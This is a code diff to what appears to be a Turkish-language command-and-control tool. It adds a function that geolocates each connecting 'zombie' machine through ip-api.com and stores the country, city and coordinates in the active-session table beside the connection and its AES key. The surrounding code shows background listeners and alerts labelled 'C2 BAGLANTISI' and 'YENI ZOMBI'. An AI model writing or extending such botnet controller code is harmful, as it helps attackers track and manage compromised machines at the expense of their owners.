@@ -16,6 +16,8 @@ import zlib
 import random
 import string
 import subprocess
+import urllib.request
+import json
 
 for stream in (sys.stdout, sys.stderr):
     try:
@@ -493,6 +495,25 @@ except:
         input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
 
 
+def get_geo_info(ip):
+    if ip == "127.0.0.1" or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172."):
+        return {"country": "Yerel Ag", "city": "Bilinmiyor", "lat": 41.0082, "lon": 28.9784} # Varsayılan: Istanbul
+    try:
+        url = f"http://ip-api.com/json/{ip}"
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=3) as response:
+            data = json.loads(response.read().decode())
+            if data.get("status") == "success":
+                return {
+                    "country": data.get("country", "Bilinmiyor"),
+                    "city": data.get("city", "Bilinmiyor"),
+                    "lat": data.get("lat", 41.0082),
+                    "lon": data.get("lon", 28.9784)
+                }
+    except:
+        pass
+    return {"country": "Bilinmiyor", "city": "Bilinmiyor", "lat": 41.0082, "lon": 28.9784}
+
 active_sessions = {}
 session_counter = 1
 bg_listener_socket = None
@@ -522,7 +543,8 @@ def start_listener_background(port):
                 conn.settimeout(None)
                 sid = session_counter
                 session_counter += 1
-                active_sessions[sid] = {"conn": conn, "addr": addr, "key": aes_key}
+                geo = get_geo_info(addr[0])
+                active_sessions[sid] = {"conn": conn, "addr": addr, "key": aes_key, "geo": geo}
                 try:
                     import Moduller.Sistem.Bildirim_Sistemi
                     Moduller.Sistem.Bildirim_Sistemi.send_alert(f"YENI ZOMBI: {addr[0]}:{addr[1]} (ID: {sid})", title="C2 BAGLANTISI")
@@ -569,7 +591,8 @@ def c2_listener():
                 conn.settimeout(None) # blocking
                 sid = session_counter
                 session_counter += 1
-                active_sessions[sid] = {"conn": conn, "addr": addr, "key": aes_key}
+                geo = get_geo_info(addr[0])
+                active_sessions[sid] = {"conn": conn, "addr": addr, "key": aes_key, "geo": geo}
                 
                 try:
                     import Moduller.Sistem.Bildirim_Sistemi
